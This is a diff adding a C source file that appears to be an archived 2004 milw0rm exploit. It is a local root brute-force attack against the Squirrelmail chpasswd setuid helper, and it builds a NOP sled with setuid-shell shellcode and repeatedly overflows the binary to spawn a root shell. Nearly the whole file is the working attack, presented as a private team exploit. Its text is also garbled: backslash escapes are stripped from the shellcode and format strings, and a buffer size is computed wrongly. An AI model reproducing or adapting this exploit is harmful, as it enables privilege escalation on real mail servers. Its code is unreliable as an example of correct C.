@@ -1,0 +1,144 @@
+/* 
+
+** PST_chpasswd_exp-v_b.c: 
+** 
+** Squirrelmail chpasswd local root bruteforce exploit 
+** Author: 
+** Bytes<Bytes[at]ph4nt0m.net> || <Bytes[at]ph4nt0m.org> 
+** www ph4nt0m net 
+** Notice: 
+** v_b: Local bruteforce version 
+** v_R: remote bruteforce version 
+** 
+** 
+** Greatze: #ph4nt0m,#music@0x557 
+** All PST member,Grip2,Airsupply,Jambalaya,Ann,Paul,Happy... 
+** Thax: My GF(Luz),Oyxin,Winewind,Envymask,Eong,luoluo,GoGo(f0r ever)... 
+** 
+** 
+** -=-=-=-=-=-=-=-=-=-= !!![+PH4NT0M TEAM PRIVATE EXPLOIT+]!!! =-=-=-=-=-=-=-=-=-=- 
+** 
+** Date: 2004-04 # DO NOT DISTRIBUTE # 
+** 
+** You Must get account belong to Webmaster ,www or other webserver groups. 
+** 
+*/ 
+
+#include <stdio.h> 
+#include <unistd.h> 
+#include <stdlib.h> 
+#include <sys/wait.h> 
+
+#define NOP 0x90 
+#define Fuckpr0 "./chpasswd" /* you need modify it by yourself */ 
+#define LOOP 2000 /* loop of bruteforce */ 
+
+/* setuid(0) shellcode by by Matias Sedalo 3x ^_^ */ 
+
+char shellcode[] ="x31xdbx53x8dx43x17xcdx80x99x68x6ex2fx73x68x68" 
+"x2fx2fx62x69x89xe3x50x53x89xe1xb0x0bxcdx80"; 
+
+unsigned long get_esp() { 
+
+__asm__ ("movl %esp,%eax"); 
+
+} 
+
+void *M_malloc(size_t size){ 
+
+register void *value; 
+
+value = malloc(size); 
+
+if(value == NULL){ 
+
+printf("ERROR:virtual memory exhausted...n"); 
+
+exit(-1); 
+
+} 
+
+return value; 
+
+} 
+
+int main(void){ 
+
+unsigned long ret_addr; 
+
+int i,j=0,offset=2,status; 
+
+char *buf1,*buf2; 
+
+pid_t pid; 
+
+ret_addr = get_esp() - strlen(Fuckpr0) - strlen(shellcode); 
+
+printf("t-------------------------------------------------------n"); 
+printf("t Squirrelmail chpasswd local root bruteforce exploit n"); 
+printf("t code By Bytes<Bytes[at]ph4nt0m.org> 2004 n"); 
+printf("t http://www.ph4nt0m.net n"); 
+printf("t#######################################################n"); 
+
+
+sleep(1); 
+
+printf("[+] Bruteforce......nn"); 
+
+sleep(2); 
+
+buf1 = (char *)M_malloc(150); 
+
+buf2 = (char *)M_malloc(600); 
+
+while(j <= LOOP){ 
+
+if((pid = fork()) == 0){ 
+
+memset(buf2,0x90,sizeof(buf2) - strlen(shellcode) - 8); 
+
+memcpy(buf2 + sizeof(buf2) - strlen(shellcode) - 8,shellcode,sizeof(shellcode)); 
+
+for(i=0; i < 150; i+=4){ 
+
+*((unsigned long *)(buf1+i)) = ret_addr; 
+
+} 
+
+printf("buf1 = %sn",buf1); 
+
+execl(Fuckpr0,"chpasswd",buf1,buf2,0); 
+
+} 
+
+wait(&status); 
+
+printf("[-] Signal: #%in", status); 
+
+if(WIFEXITED(status) != 0 ) { 
+
+printf("[=] Step.%i: 0x%xn[~] Exiting...n",(j/2),ret_addr); 
+
+exit(1); 
+
+}else{ 
+
+ret_addr += offset; 
+
+j += offset; 
+
+printf("[=] Offset:%d Use ret:0x%xn",j, ret_addr); 
+
+} 
+
+} 
+
+free(buf1); 
+
+free(buf2); 
+
+return 1; 
+
+} 
+
+// milw0rm.com [2004-08-25]
